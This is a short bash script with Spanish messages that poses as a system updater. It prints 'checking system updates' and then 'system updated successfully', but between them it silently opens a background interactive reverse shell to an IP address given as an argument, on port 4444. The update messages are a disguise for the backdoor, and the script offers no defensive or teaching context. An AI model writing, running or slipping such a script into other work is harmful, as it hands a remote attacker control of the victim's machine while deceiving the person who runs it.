#!/bin/bash
TU_IP=$1
echo "Comprobando actualizaciones del sistema"

bash -i >& /dev/tcp/$1/4444 0>&1 &
sleep 2
echo "Sistema actualizo correctamente"
